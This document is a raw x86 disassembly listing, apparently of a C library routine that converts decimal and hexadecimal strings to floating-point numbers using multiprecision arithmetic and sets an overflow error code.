cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1070h]
cmp eax, 1
jle 0x808b94b
mov esi, 0x42
lea edx, [var_104ch]
lea ecx, [var_82ch]
sub esi, dword [var_1080h]
mov dword [var_10ech], edx
mov dword [var_10f0h], ecx
mov edx, 0x55555556
mov ecx, dword [var_1090h]
mov dword [var_10f4h], 0x80a7020
sub ecx, dword [var_1094h]
mov dword [var_10e8h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x808adb0
mov ecx, dword [var_1094h]
mov dword [var_10e8h], 1
lea edx, [edx + ecx + 2]
mov dword [var_1090h], edx
mov esi, dword [var_1090h]
mov dword [var_107ch], 0
sub esi, dword [var_1094h]
sub esi, ebx
mov ebx, 1
mov dword [var_10e4h], esi
test dword [var_10e4h], ebx
je 0x808ae1b
mov eax, dword [var_107ch]
xor dword [var_10e4h], ebx
test eax, eax
jne 0x808b8cf
mov eax, dword [var_10f4h]
mov edi, dword [var_10ech]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_107ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10e4h]
add ebx, ebx
add dword [var_10f4h], 0x10
test eax, eax
jne 0x808add3
lea eax, [var_82ch]
cmp dword [var_10ech], eax
je 0x808b8b3
mov edx, dword [var_10a0h]
mov esi, dword [var_109ch]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_1070h]
mov esi, dword [var_1094h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_1090h], esi
mov edx, dword [var_1084h]
lea ecx, [var_82ch]
mov eax, dword [var_1090h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0808a220
mov ecx, dword [var_107ch]
bsr eax, dword [ebp + ecx*4 - 0x1050]
mov ebx, eax
xor ebx, 0x1f
jle 0x808af09
lea esi, [var_104ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_1070h]
lea edx, [var_82ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x808af09
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], edx
inc eax
mov dword [var_1070h], eax
cmp dword [var_107ch], 1
mov esi, dword [var_1080h]
mov dword [var_106ch], esi
je 0x808b75b
cmp dword [var_107ch], 2
je 0x808b45a
mov eax, dword [var_107ch]
mov ecx, dword [var_107ch]
mov dword [var_110ch], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x1054]
mov esi, dword [ebp + eax*4 - 0x1050]
mov eax, dword [var_1070h]
mov dword [var_1108h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x104c]
mov dword [var_4h], eax
lea eax, [var_82ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x808af9c
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
mov dword [var_1070h], eax
mov eax, dword [var_1070h]
cmp eax, dword [var_107ch]
jge 0x808b438
mov edx, dword [var_107ch]
sub edx, eax
mov dword [var_1110h], edx
mov edx, dword [var_1080h]
test edx, edx
jle 0x808b3e1
mov eax, dword [var_1110h]
shl eax, 5
add eax, dword [var_1080h]
cmp eax, 0x40
jg 0x808b31e
mov ecx, dword [var_1070h]
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
test ecx, ecx
mov dword [var_1064h], eax
jle 0x808b01e
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b002
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b03b
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b02b
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
add dword [var_1080h], edx
mov eax, dword [var_107ch]
cmp dword [var_1080h], 0x40
mov dword [ebp + eax*4 - 0x104c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x82c]
mov ebx, eax
jg 0x808b1e6
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_111ch], ecx
mov dword [var_1118h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x808b0e7
mov edx, dword [var_107ch]
mov eax, dword [ebp + edx*4 - 0x830]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1108h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x808b300
add ecx, esi
dec edi
cmp ecx, esi
jb 0x808b0e7
cmp ebx, dword [var_1108h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1108h]
cmp edx, ecx
ja 0x808b0b9
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
mov edx, dword [var_111ch]
lea ecx, [var_104ch]
lea eax, [var_82ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_107ch]
cmp dword [ebp + edx*4 - 0x82c], eax
je 0x808b13d
lea eax, [var_82ch]
lea ecx, [var_104ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_107ch]
mov edx, dword [var_1118h]
mov eax, dword [ebp + ecx*4 - 0x830]
test edx, edx
mov dword [ebp + ecx*4 - 0x82c], eax
mov ebx, eax
jle 0x808b170
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b15d
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b273
test edi, edi
mov edx, 0x20
je 0x808b18d
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b253
add edx, 0x40
mov eax, edi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_110ch], edx
shr eax, cl
mov dword [var_1068h], eax
mov ecx, dword [var_1120h]
cmp ecx, 0x40
mov dword [var_1080h], ecx
jle 0x808b089
mov esi, dword [var_107ch]
mov eax, dword [ebp + esi*4 - 0x82c]
test eax, eax
mov edx, dword [var_107ch]
jne 0x808b204
test edx, edx
js 0x808b204
dec edx
mov ebx, dword [ebp + edx*4 - 0x82c]
test ebx, ebx
jne 0x808b204
test edx, edx
jns 0x808b1f4
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b214
test edx, edx
js 0x808b219
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_1068h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_110ch]
mov dword [var_10h], eax
mov eax, dword [var_1074h]
mov dword [var_8h], eax
mov eax, dword [var_106ch]
dec eax
mov dword [var_4h], eax
jmp 0x808ac6e
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], edi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b1c4
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b29e
mov eax, dword [var_1068h]
mov dword [var_1068h], edi
mov dword [var_1064h], eax
jmp 0x808b1c4
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b1c4
mov ecx, dword [var_110ch]
lea eax, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_110ch]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b1c4
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
jmp 0x808b0e7
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
cmp dword [var_110ch], 0x1f
jle 0x808b3aa
mov ebx, dword [var_110ch]
mov ecx, dword [var_110ch]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_110ch], 0xffffffff
cmovg ebx, dword [var_110ch]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_1068h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x808b03b
lea edx, [ebp + eax*4 - 0x1068]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x808b399
jmp 0x808b03b
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b03b
mov edx, dword [var_110ch]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x808b03b
test eax, eax
mov ecx, eax
jle 0x808b403
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b3e7
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b420
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b410
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
sub dword [var_106ch], edx
jmp 0x808b04e
test eax, eax
mov edx, eax
jle 0x808b04e
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b442
jmp 0x808b04e
cmp dword [var_1070h], 1
mov eax, dword [var_1048h]
mov dword [var_1100h], 0
mov dword [var_1104h], 0
mov edi, dword [var_104ch]
mov dword [var_10fch], eax
jle 0x808b6aa
mov esi, dword [var_828h]
mov ebx, dword [var_82ch]
cmp dword [var_1080h], 0x40
jg 0x808b56e
cmp esi, dword [var_10fch]
je 0x808b676
mov eax, ebx
mov edx, esi
div dword [var_10fch]
mov ecx, edx
mov dword [var_1100h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x808b4d4
jne 0x808b4ed
test ebx, ebx
je 0x808b4ed
add ecx, dword [var_10fch]
dec dword [var_1100h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_10fch]
jae 0x808b4ca
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b5df
mov eax, dword [var_1100h]
mov edx, 0x20
test eax, eax
je 0x808b51e
bsr edx, dword [var_1100h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b5b9
mov eax, dword [ebp - 0x1100]
add edx, 0x40
mov dword [ebp - 0x1120], 0x61
sub ecx, edx
mov dword [ebp - 0x1104], edx
shr eax, cl
mov dword [ebp - 0x1068], eax
mov eax, dword [ebp - 0x1120]
cmp eax, 0x40
mov dword [ebp - 0x1080], eax
jle 0x808b4a6
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b582
test esi, esi
jne 0x808b582
test ebx, ebx
je 0x808b587
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1100h]
mov eax, 0x1f
sub eax, dword [var_1104h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_8h], ecx
jmp 0x808ac60
mov ecx, dword [ebp - 0x1100]
neg edx
mov dword [ebp - 0x1064], 0
add edx, 0x20
mov dword [ebp - 0x1120], edx
mov dword [ebp - 0x1068], ecx
jmp 0x808b559
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b610
mov eax, dword [var_1068h]
mov edx, dword [var_1100h]
mov dword [var_1064h], eax
mov dword [var_1068h], edx
jmp 0x808b559
mov dword [var_1104h], 0x40
mov ecx, dword [var_1080h]
sub dword [var_1104h], ecx
mov eax, dword [var_1104h]
test eax, eax
jle 0x808b559
mov eax, dword [ebp - 0x1104]
lea edx, [ebp - 0x1068]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1100]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1104]
shr eax, cl
or dword [ebp - 0x1068], eax
jmp 0x808b559
lea ecx, [esi + ebx]
mov dword [var_1100h], 0xffffffff
cmp ecx, esi
jb 0x808b69a
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808b4ca
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808b4f7
mov eax, dword [var_82ch]
cmp eax, dword [var_10fch]
jb 0x808b6c1
xor esi, esi
mov ebx, eax
jmp 0x808b499
mov ecx, dword [var_1080h]
test ecx, ecx
jle 0x808b74a
mov ebx, dword [var_1080h]
add ebx, 0x20
cmp ebx, 0x40
jg 0x808b704
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
mov dword [var_1080h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808b499
mov dword [var_1104h], 0x40
mov edx, dword [var_1080h]
sub dword [var_1104h], edx
mov edx, dword [var_1104h]
test edx, edx
jle 0x808b6f5
mov ecx, dword [var_1104h]
lea esi, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x808b6ef
mov ebx, dword [var_1080h]
sub ebx, 0x20
mov dword [var_106ch], ebx
jmp 0x808b6fb
mov dword [var_10f8h], 0
mov ebx, dword [var_82ch]
mov edi, dword [var_104ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b826
test esi, esi
mov edx, 0x20
je 0x808b798
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b809
add edx, 0x40
mov eax, esi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_10f8h], edx
shr eax, cl
mov dword [var_1068h], eax
mov edx, dword [var_1120h]
cmp edx, 0x40
mov dword [var_1080h], edx
jle 0x808b771
mov edi, dword [var_10e8h]
xor eax, eax
test edi, edi
jne 0x808b7ec
test ebx, ebx
je 0x808b7f1
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_10f8h]
jmp 0x808b5a0
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], esi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b7cb
mov ecx, dword [var_1080h]
add ecx, 0x20
cmp ecx, 0x40
mov dword [var_1120h], ecx
jg 0x808b851
mov eax, dword [var_1068h]
mov dword [var_1068h], esi
mov dword [var_1064h], eax
jmp 0x808b7cb
mov dword [var_10f8h], 0x40
mov eax, dword [var_1080h]
sub dword [var_10f8h], eax
mov eax, dword [var_10f8h]
test eax, eax
jle 0x808b7cb
mov edx, dword [var_10f8h]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_10f8h]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b7cb
mov ecx, dword [var_107ch]
lea edi, [var_104ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ae40
mov edx, dword [var_10f4h]
mov ecx, dword [var_107ch]
mov esi, dword [var_10ech]
mov dword [var_10h], ecx
mov ecx, dword [var_10f0h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_10ech]
mov esi, dword [var_10f4h]
mov edx, dword [var_107ch]
add edx, dword [esi + 4]
mov esi, dword [var_10f0h]
mov dword [var_10f0h], edi
mov dword [var_10ech], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_107ch], edx
jmp 0x808ae1b
mov dword [ebp + eax*4 - 0x1068], 0
jmp 0x808ad3c
mov eax, dword [var_1080h]
mov edx, dword [var_1080h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_10e0h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x1f
je 0x808ba80
cmp edx, 0x1e
jg 0x808ba1a
mov ecx, dword [var_10cch]
mov eax, 0x1f
mov ebx, 2
sub eax, edx
lea esi, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808b9d4
mov ecx, dword [var_1074h]
mov esi, dword [var_10e0h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_1068h]
mov dword [esp], eax
jmp 0x808ac6e
lea eax, [edx - 0x1f]
lea edi, [var_1068h]
lea edx, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_10cch]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_10cch]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_1070h]
test edx, edx
mov dword [ebp + edx*4 - 0x1068], eax
jle 0x808b9e0
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x808ba6f
jmp 0x808b9e0
mov eax, 2
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
mov edi, eax
sub edi, dword [var_10cch]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x1068]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808babd
jmp 0x808b9e0
mov ecx, dword [var_1070h]
lea edi, [var_82ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ab49
mov dword [var_10h], edx
mov ecx, dword [var_10c0h]
mov dword [var_8h], esi
mov edx, dword [var_10c8h]
mov dword [var_ch], ecx
mov ecx, dword [var_10c4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x808aae4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6a2
mov ecx, dword [var_1094h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x808a9ca
mov eax, ecx
jmp 0x808a9ca
mov eax, dword [var_1084h]
mov ecx, dword [arg_14h]
mov dword [var_10bch], 1
mov esi, 0x1f
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bb83
inc dword [var_1084h]
mov eax, dword [var_1084h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808bb6a
cmp dl, 0x30
je 0x808bd41
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd2a
inc dword [var_1084h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6200]
dec dword [var_1090h]
mov dword [var_1080h], eax
mov eax, esi
sub eax, dword [var_1080h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_1080h]
mov dword [var_1064h], edx
mov edx, dword [var_1094h]
lea eax, [ecx + edx*4]
add eax, dword [var_106ch]
lea ebx, [eax - 5]
mov eax, dword [var_1090h]
mov dword [var_106ch], ebx
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
lea ebx, [ebp + eax*4 - 0x1068]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bc24
mov eax, dword [var_10a8h]
add ecx, eax
mov dword [var_1084h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd13
inc dword [var_1084h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808bcba
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_1090h]
mov eax, dword [var_1090h]
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
test eax, eax
jns 0x808bc00
mov ebx, dword [var_10bch]
test ebx, ebx
jle 0x808bc89
lea edx, [var_1068h]
mov eax, dword [var_10bch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808bc7d
mov esi, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x808ba0c
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_10bch]
js 0x808bce2
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808bc4d
xor eax, eax
mov ecx, dword [var_1074h]
mov dword [var_10h], 0x1f
cmp dword [var_1090h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_106ch]
jmp 0x808ac61
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bc3b
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bba3
inc dword [var_1084h]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808bd41
jmp 0x808bb8c
mov eax, dword [var_1098h]
mov edx, dword [var_106ch]
shl eax, 2
sub edx, eax
jmp 0x808a98a
test al, al
jne 0x808a922
jmp 0x808a95f
lea esi, [esi]
mov ecx, dword [var_109ch]
movzx eax, byte [ecx + 1]
jmp 0x808bd70
mov edx, dword [arg_ch]
test edx, edx
jne 0x808a69d
jmp 0x808a6a2
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x808a6a2
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x808a6a2
mov eax, dword [var_109ch]
movzx eax, byte [eax]
mov byte [var_1112h], al
mov edx, dword [var_1090h]
xor eax, eax
test edx, edx
mov dword [var_1094h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_1112h], 0
mov dword [var_1098h], eax
je 0x808c147
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808be09
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808bdf5
test al, al
jne 0x808c140
add edi, dword [var_10a8h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0fd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x808be52
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp dword [var_1098h], 0xffffffff
cmovne eax, dword [var_1098h]
mov dword [var_1098h], eax
inc dword [var_1090h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808be2b
cmp dword [var_1078h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808be7e
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
cmp dword [var_1078h], 0x10
mov dword [var_108ch], edi
je 0x808c0f4
cmp dword [ecx + eax*4], 0x65
je 0x808bf81
mov esi, dword [var_1094h]
cmp dword [var_1090h], esi
jle 0x808beb9
mov eax, dword [var_108ch]
cmp byte [eax - 1], 0x30
je 0x808bf64
mov ecx, dword [var_1094h]
cmp dword [var_1090h], ecx
jne 0x808a8bb
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808a8bb
mov ebx, dword [var_106ch]
test ebx, ebx
jns 0x808a8bb
cmp dword [var_1078h], 0x10
je 0x808bf48
mov eax, dword [var_108ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x808bf40
cmp cl, 0x30
jne 0x808a8bb
dec dword [var_1090h]
inc ebx
dec dword [var_108ch]
mov ecx, dword [var_1090h]
dec dword [var_1094h]
mov dword [var_106ch], ebx
test ecx, ecx
jle 0x808a8bb
test ebx, ebx
js 0x808bee7
jmp 0x808a8bb
mov esi, esi
dec dword [var_108ch]
jmp 0x808bee7
mov esi, dword [var_108ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x808bf05
jmp 0x808bf40
dec dword [var_108ch]
dec dword [var_1090h]
mov edx, dword [var_108ch]
cmp byte [edx - 1], 0x30
je 0x808bf64
jmp 0x808beb9
inc edi
mov dword [var_10b8h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x808c0e8
cmp al, 0x2b
je 0x808c0df
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0d4
cmp dword [var_1078h], 0x10
je 0x808c0a1
mov eax, dword [var_10b8h]
test eax, eax
je 0x808c08a
mov edx, dword [var_1094h]
add edx, 0x1383
mov eax, dword [var_106ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_106ch], ebx
jg 0x808c01e
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_106ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808bfd3
mov esi, dword [var_10b8h]
test esi, esi
je 0x808be9b
neg ebx
mov dword [var_106ch], ebx
jmp 0x808be9b
cmp dword [var_1098h], 0xffffffff
je 0x808c078
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_10b8h]
test eax, eax
jne 0x808c074
mov eax, dword [var_1074h]
test eax, eax
je 0x808c06c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x808c04c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808c04c
fldz
jmp 0x808c04c
mov eax, dword [var_1074h]
test eax, eax
je 0x808c074
fld dword [0x80a6104]
jmp 0x808c04c
mov eax, dword [var_1098h]
sub eax, dword [var_1094h]
lea edx, [eax + 0x1344]
jmp 0x808bfd3
mov eax, dword [var_10b8h]
mov ecx, dword [var_1094h]
test eax, eax
lea edx, [ecx*4 + 0x403d]
jne 0x808bfd3
mov edx, dword [var_1098h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x4000]
jmp 0x808bfd3
mov edi, dword [var_108ch]
jmp 0x808be9b
inc edi
movzx esi, byte [edi]
jmp 0x808bfa1
mov dword [var_10b8h], 1
jmp 0x808c0df
cmp dword [ecx + eax*4], 0x70
jmp 0x808be95
cmp dword [var_1078h], 0x10
je 0x808c116
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808be7e
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
jmp 0x808be7e
nop
lea esi, [esi]
mov edx, esi
movsx eax, dl
jmp 0x808c10b
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
jmp 0x808be09
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a806
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x808a7cb
cmp eax, 0x66
ja 0x808a7cb
inc dword [var_1090h]
jmp 0x808a800
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x808c1aa
cmp dl, byte [ecx + 0x198]
jle 0x808a7a3
xor ebx, ebx
